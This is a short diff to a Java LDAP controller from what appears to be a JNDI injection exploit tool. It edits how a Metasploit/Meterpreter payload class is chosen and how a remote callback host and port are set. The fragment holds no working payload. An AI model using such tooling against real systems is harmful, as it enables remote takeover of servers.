@@ -56,7 +56,7 @@ public class BasicController implements LdapController {
                 className = commandTemplate.getClassName();
             }
 
-            if (payloadType.contains("meterpreter")) {
+            if (payloadType.contains("msf")) {
                 className = Meterpreter.class.getName();
             }
 
@@ -118,7 +118,7 @@ public class BasicController implements LdapController {
             }
 
             if (gadgetType == GadgetType.msf) {
-                String[] results1 = Util.getIPAndPortFromBase(base);
+                String[] results1     = Util.getIPAndPortFromBase(base);
                 Config.rhost = results1[0];
                 Config.rport = results1[1];
                 System.out.println("[+] RemotHost: " + results1[0]);
